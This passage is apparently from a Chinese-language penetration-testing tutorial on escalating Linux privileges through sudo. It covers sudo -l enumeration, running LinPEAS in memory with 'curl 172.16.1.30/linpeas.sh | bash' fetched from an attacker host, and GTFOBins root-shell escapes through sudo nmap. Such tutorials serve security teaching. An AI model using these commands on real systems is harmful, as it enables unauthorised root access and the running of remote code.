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" width="437" height="64" class="img_ev3q"></p>
<p>现在我们了解了<strong>sudo</strong>是什么以及它是如何工作的，让我们看看如何枚举它。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="2手动寻找-sudo-权限"><strong><div id="id2">2、手动寻找 Sudo 权限</div></strong><a href="#2手动寻找-sudo-权限" class="hash-link" aria-label="2手动寻找-sudo-权限的直接链接" title="2手动寻找-sudo-权限的直接链接">​</a></h2>
<p>首先，假设我们已找到凭证并以标准用户 <strong>cain</strong>的身份通过 SSH 登录在目标 Linux 计算机上。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165046465-548165911-2bc30a9b843aeeaf336b1bce3da45745.png" width="548" height="270" class="img_ev3q"></p>
<p>当涉及到枚举<strong>sudo</strong>权限时，作为标准用户的我们只能查看两点：</p>
<ol>
<li>当前用户的<strong>sudo</strong>权限</li>
<li>在<strong>sudo</strong>组中的所有用户</li>
</ol>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="21枚举我们当前用户的-sudo-权限"><strong><div id="id2.1">2.1、枚举我们当前用户的 Sudo 权限</div></strong><a href="#21枚举我们当前用户的-sudo-权限" class="hash-link" aria-label="21枚举我们当前用户的-sudo-权限的直接链接" title="21枚举我们当前用户的-sudo-权限的直接链接">​</a></h4>
<p>只有 root 才能查看/etc/sudoers文件，这就是为什么我们无法枚举所有其他用户的sudo权限。</p>
<p>但是，我们可以使用以下命令轻松检查当前用户可以使用sudo运行哪些程序：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo -l</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165047127-142475482-a622772e55c8d37cd65ee6f95f71ec4a.png" width="956" height="202" class="img_ev3q"></p>
<p>在这里我们可以看到我们当前的用户<strong>cain</strong>能够使用<strong>sudo</strong>运行相当多的程序；对于上面的大部分程序来说，使用sudo执行时无需提供密码。</p>
<p>通常，这会提示我们输入当前用户的密码；然而，在本例中却没有，因为某些条目已设置了 NOPASSWD。</p>
<p>或者，如果系统提示我们输入密码但我们还不知道，我们应该开始考虑寻找一个密码。</p>
<blockquote>
<p>要了解如何在 Linux 目标上执行密码搜索，请查看<a href="https://juggernaut-sec.com/password-hunting-lpe/" target="_blank" rel="noopener noreferrer">帖子</a>。</p>
</blockquote>
<p>虽然这向我们展示了当前用户可以使用<strong>sudo</strong>运行什么，但如果我们对其他用户可以运行什么也感兴趣怎么办？</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="22枚举-sudo-组中的用户"><strong><div id="id2.2">2.2、枚举 Sudo 组中的用户</div></strong><a href="#22枚举-sudo-组中的用户" class="hash-link" aria-label="22枚举-sudo-组中的用户的直接链接" title="22枚举-sudo-组中的用户的直接链接">​</a></h4>
<p>如上所述，除非我们是 root，否则我们无法读取<strong>sudoers</strong>文件；但是，我们可以检查<strong>sudo</strong>组中的任何用户。</p>
<p>为此，我们可以设置一个快速循环来获取系统上所有用户帐户的列表，然后对每个帐户运行<strong>id命令。</strong></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">for user in $(cat /etc/passwd | awk -F: &#x27;{print $1}&#x27;);do echo &quot;$user&quot; ; id &quot;$user&quot; ;done | grep -B 1 &quot;sudo&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165046586-892568442-af9463e31cc943ff973ca2d6dac53379.png" width="945" height="96" class="img_ev3q"></p>
<p>这里我们可以看到一个用户：<strong>juggernaut</strong>属于<strong>sudo</strong>组。</p>
<p>如果sudoers文件中sudo组的默认配置尚未更改，则意味着该用户在系统上拥有完全的sudo访问权限。</p>
<p>作为标准用户，这就是我们在<strong>sudo</strong>枚举方面所受到的限制。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="3自动寻找-sudo-权限--linpeas"><strong><div id="id3">3、自动寻找 Sudo 权限 – LinPEAS</div></strong><a href="#3自动寻找-sudo-权限--linpeas" class="hash-link" aria-label="3自动寻找-sudo-权限--linpeas的直接链接" title="3自动寻找-sudo-权限--linpeas的直接链接">​</a></h2>
<p>LinPEAS 是后渗透枚举工具，因为它提供了大量信息。在受害者上运行后，我们将看到与手动枚举相同的所有内容，以及更多内容。</p>
<p>然而，在使用工具之前展示手动步骤非常重要，以便我们了解工具的输出以及要查找的内容。</p>
<blockquote>
<p>如果您没有 LinPEAS 的副本，您可以 <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank" rel="noopener noreferrer">在这里</a>获取一份。</p>
</blockquote>
<p>通常，当我们运行 LinPEAS 时，我们会不带参数运行它来运行“所有检查”，然后从上到下逐行梳理所有输出。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="31在内存中执行-linpeas"><strong><div id="id3.1">3.1、在内存中执行 LinPEAS</div></strong><a href="#31在内存中执行-linpeas" class="hash-link" aria-label="31在内存中执行-linpeas的直接链接" title="31在内存中执行-linpeas的直接链接">​</a></h4>
<p>获取 LinPEAS 的副本后，我们通常会将副本传输到受害者身上，然后执行它。相反，对于本示例，我们将直接将其下载并执行到内存中。</p>
<p>首先，我们需要在攻击者计算机的 <strong>linpeas.sh</strong>所在目录中设置一个 HTTP 服务器 。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -m http.server 80</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165048789-2128019795-5fc5d69561efcffabb0d76be3ebd6f27.png" width="959" height="178" class="img_ev3q"></p>
<p>然后，回到受害者机器上，我们可以使用以下命令将 LinPEAS 下载并直接执行到内存中：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl 172.16.1.30/linpeas.sh | bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>通过管道将命令传递到 bash，cURL 会将脚本输入 bash 并直接在内存中执行，而不会将其写入磁盘！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165046290-715416907-53c9090b9f5881601008734665ce750f.png" width="658" height="84" class="img_ev3q"></p>
<p>此处看到全为 0 确认该文件未下载到磁盘。这意味着脚本是直接在内存中执行的！</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="32枚举-sudo-权限"><strong><div id="id3.2">3.2、枚举 Sudo 权限</div></strong><a href="#32枚举-sudo-权限" class="hash-link" aria-label="32枚举-sudo-权限的直接链接" title="32枚举-sudo-权限的直接链接">​</a></h4>
<p>好吧，一旦脚本运行完毕，我们就可以梳理结果，看看 LinPEAS 枚举我们已经手动找到的东西的效果如何。</p>
<p>使用LinPEAS时，我们可以检查<strong>User Information</strong>部分来查找当前用户的sudo权限以及sudo组中的任何用户。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165047064-1761820252-8d0acca9f6da4061867bb73cd04ca73a.png" width="952" height="413" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165047449-520635692-56b6ab067c200bdd45a553450f389847.png" width="951" height="160" class="img_ev3q"></p>
<p>这表明，很多我们可以使用 sudo 运行的二进制文件都是<strong>红色/黄色</strong>，这意味着它们有 95% 的可能性会导致 root 升级。</p>
<p>在本例中，所有红色/黄色的结果表明可以在 GTFOBins 上轻松找到漏洞利用。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="4利用-sudo-命令--gtfobins"><strong><div id="id4">4、利用 Sudo 命令 – GTFOBins</div></strong><a href="#4利用-sudo-命令--gtfobins" class="hash-link" aria-label="4利用-sudo-命令--gtfobins的直接链接" title="4利用-sudo-命令--gtfobins的直接链接">​</a></h2>
<p>为了开始利用示例，我们将使用 GTFOBins 来利用上面发现的四个红色/黄色标识的命令。</p>
<p>对于这些示例，了解 GTFOBins 是什么及其工作原理非常重要，因此让我们快速回顾一下。</p>
<p>GTFOBins 是 Unix 二进制文件的精选列表，可用于绕过配置错误的系统中的本地安全限制。</p>
<p>对于 GTFOBins 上可用的所有漏洞，它们都有一个共同点，即它们假设以 root 身份执行。</p>
<p>尽管如此，GTFOBins 还是针对我们可能遇到的不同情况（sudo，SUID等）展示了不同的技术。</p>
<p>无论如何，当涉及到<strong>sudo</strong>时，我们总是以 root 身份执行二进制文件，这意味着我们不应该将自己限制在 GTFOBins 上提供的漏洞利用上【注：例如上面出现的sudo apache命令】。</p>
<p>还需要注意的是，并非<strong>sudoers</strong>文件中的每个易受攻击的条目都会立即生成 root shell。相反，它们可能提供以 root 身份执行诸如读取或写入文件之类的操作的能力。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="41利用简单shell二进制--nmap-和-rsync"><strong><div id="id4.1">4.1、利用简单Shell二进制 – nmap 和 rsync</div></strong><a href="#41利用简单shell二进制--nmap-和-rsync" class="hash-link" aria-label="41利用简单shell二进制--nmap-和-rsync的直接链接" title="41利用简单shell二进制--nmap-和-rsync的直接链接">​</a></h4>
<p>我们当前用户可以使用sudo运行的两个程序是<strong>nmap</strong>和<strong>rsync</strong>。幸运的是，这两个二进制文件很容易被利用并升级为 root。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="411nmap"><strong><div id="id4.1.1">4.1.1、Nmap</div></strong><a href="#411nmap" class="hash-link" aria-label="411nmap的直接链接" title="411nmap的直接链接">​</a></h6>
<p>从<strong>nmap</strong>开始，我们可以看到 GTFOBins 上有两种看起来很有趣的不同漏洞利用。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165046833-2086962880-fb59f557679e1877c4ecbee02601f87c.png" width="830" height="361" class="img_ev3q"></p>
<p>第一个创建一个执行 /bin/sh 的脚本，然后使用<strong>nmap</strong>执行该脚本。</p>
<p>或者，第二个使用可以作为 root 打破的“交互”模式。不过，该漏洞有版本要求，仅适用于 2.02 – 5.21 版本。</p>
<p><strong>Nmap Version 2.02 – 5.21</strong></p>
<p>由于利用 B 更“容易”，我们可以通过检查主机上运行的 nmap 版本来实现。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/nmap --version</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165047329-1082362685-f35c77e35261fc508b19d44f208ac5f3.png" width="432" height="62" class="img_ev3q"></p>
<p>完美的！我们可以看到版本是3.81，属于易受攻击的范围。</p>
<p>由于该版本容易受到漏洞利用 (b)，因此我们可以简单地使用 GTFOBins 提供的命令并获取 root shell。</p>
<blockquote>
<p>提示：当使用 GTFOBins 上发现的漏洞时，请始终使用 <strong>sudo -l</strong> 输出中找到的二进制文件的绝对路径。</p>
</blockquote>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo /usr/bin/nmap --interactive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">!sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165046742-1563266227-39b7c3ffe65bc08d595e237b5c38e1ed.png" width="485" height="159" class="img_ev3q"></p>
<p><strong>Nmap Version &gt;5.21</strong></p>
<p>然而，如果我们碰巧发现版本&gt;5.21，那么我们就必须使用exploit(a)。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/nmap --version</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165048133-1817283904-d26e09469567d67f98e939d8ec426110.png" width="954" height="125" class="img_ev3q"></p>
<p>我们所要做的就是简单地复制并粘贴我们在 GTFOBins 上看到的漏洞利用程序。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">TF=$(mktemp)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sudo /usr/bin/nmap --script=$TF</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165046825-784652319-921b2b84c98bffd6c00cdfa523109d73.png" width="725" height="128" class="img_ev3q"></p>
<p>Boom！它是有效的，但是 shell 非常不稳定，我们看不到我们输入的任何内容。例如，上面我输入<strong>whoami</strong>它输出“root”，但我们看不到我们执行命令的痕迹。</p>
<p>因为这个 shell 不稳定，所以我们可以通过将 bash 复制到 /tmp 并提供<strong>SUID</strong>位来升级它。一旦完成，我们就可以退出这个 shell 并进入稳定的 shell。</p>
